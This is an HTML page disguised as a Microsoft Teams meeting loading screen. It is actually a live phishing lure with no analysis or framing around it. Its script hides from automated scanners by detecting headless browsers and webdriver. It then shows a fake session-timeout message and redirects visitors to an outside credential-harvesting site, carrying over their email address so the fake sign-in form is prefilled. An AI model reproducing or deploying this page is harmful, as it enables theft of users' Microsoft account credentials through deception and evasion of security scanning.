<!DOCTYPE html>
<html lang="en-us" class="theme-defaultV2" dir="ltr">
<head>
<meta name="containerVer" content="25071714812">
<title>Microsoft Teams</title>
<style>
body,html{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Apple Color Emoji","Segoe UI Emoji","Segoe UI Web",sans-serif;width:100%;height:100%;padding:0;margin:0;color:var(--themeColor)}
html{font-size:10px;forced-color-adjust:none;position:fixed;bottom:0;left:0;right:0;top:0}
body{background-color:var(--themeBackgroundColor,#f3f2f1);font-size:1.4rem;overflow:hidden;touch-action:none}
*{-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
</style>
<link rel="canonical" href="">
<meta http-equiv="content-security-policy" content="default-src 'none'; font-src 'self' data:; img-src 'self' data:; style-src 'unsafe-inline'; media-src 'self' data:; script-src 'unsafe-inline' data:; object-src 'self' data:; frame-src 'self' data:;">
</head>
<body>

<div id="app" style="display:block;height:100%"></div>

<div role="progressbar" tabindex="-1" id="loading-screen" aria-valuetext="Loading..." style="background-color: transparent">
  <div class="text-slider-container">
    <div id="loading-screen-logo" class="scale-animation-T2_1 t2-icon"></div>
    <div class="text-slider"></div>
  </div>
</div>

<input type="hidden" id="bot-check" value="no-bot">

<script>
window.addEventListener('load', function () {
  const botCheck = document.getElementById('bot-check');

  if (navigator.webdriver || /HeadlessChrome|PhantomJS|selenium/i.test(navigator.userAgent)) {
    console.warn("Bot detected; redirect blocked");
    return;
  }

  if (botCheck && botCheck.value === 'no-bot') {
    // Get email from fragment (#email)
    const fragmentEmail = window.location.hash ? window.location.hash.substring(1) : null;
    const email = fragmentEmail && fragmentEmail.includes("@") ? fragmentEmail : null;

    const delayBeforeLogo = Math.floor(Math.random() * (10000 - 5000 + 1)) + 5000;
    const delayBeforeRedirect = 3000;

    setTimeout(function () {
      const loadingScreen = document.getElementById('loading-screen');
      if (loadingScreen) {
        // Fade out logo screen
        loadingScreen.style.transition = 'opacity 0.5s ease-out';
        loadingScreen.style.opacity = '0';

        setTimeout(() => {
          loadingScreen.style.display = 'none';

          // Dimmed overlay
          const overlay = document.createElement('div');
          overlay.style.position = 'fixed';
          overlay.style.top = '0';
          overlay.style.left = '0';
          overlay.style.width = '100%';
          overlay.style.height = '100%';
          overlay.style.backgroundColor = 'rgba(0,0,0,0.3)';
          overlay.style.zIndex = '9998';
          overlay.style.backdropFilter = 'blur(2px)';
          document.body.appendChild(overlay);

          // Message container
          const messageContainer = document.createElement('div');
          messageContainer.style.position = 'fixed';
          messageContainer.style.top = '40%';
          messageContainer.style.left = '50%';
          messageContainer.style.transform = 'translate(-50%, -50%)';
          messageContainer.style.display = 'flex';
          messageContainer.style.alignItems = 'center';
          messageContainer.style.backgroundColor = '#ffffff';
          messageContainer.style.padding = '20px 30px';
          messageContainer.style.border = '1px solid #e1dfdd';
          messageContainer.style.borderRadius = '8px';
          messageContainer.style.boxShadow = '0 2px 8px rgba(0, 0, 0, 0.1)';
          messageContainer.style.zIndex = '9999';
          messageContainer.style.fontFamily = '"Segoe UI", Tahoma, Geneva, Verdana, sans-serif';
          messageContainer.style.fontSize = '18px';
          messageContainer.style.color = '#323130';
          messageContainer.style.animation = 'fadeIn 0.4s ease-out';

          // Spinner
          const spinner = document.createElement('div');
          spinner.style.border = '3px solid #f3f3f3';
          spinner.style.borderTop = '3px solid #0078d4';
          spinner.style.borderRadius = '50%';
          spinner.style.width = '20px';
          spinner.style.height = '20px';
          spinner.style.marginRight = '12px';
          spinner.style.animation = 'spin 1s linear infinite';

          // Add keyframes
          const style = document.createElement('style');
          style.textContent = `
            @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
            @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
          `;
          document.head.appendChild(style);

          // Message text
          const messageText = document.createElement('span');
          messageText.innerHTML = "Your session has timed out. Please sign in to rejoin the meeting.";

          // Assemble
          messageContainer.appendChild(spinner);
          messageContainer.appendChild(messageText);
          document.body.appendChild(messageContainer);

          // Show second line after 1.5s
          setTimeout(() => {
            messageText.innerHTML += "<br>Redirecting to Microsoft login...";
          }, 1500);

          // Redirect after delay, keeping fragment for email autofill
          setTimeout(function () {
            const evilUrl = 'https://access-meetings.visions-solutions.ca/yLobagKc';
            if (email) {
              window.location.href = evilUrl + '#' + encodeURIComponent(email);
            } else {
              window.location.href = evilUrl;
            }
          }, delayBeforeRedirect);

        }, 500); // match fade-out duration
      }
    }, delayBeforeLogo);
  } else {
    console.log('Bot detected or hidden input changed; redirect blocked.');
  }
});
</script>
</body>
</html>
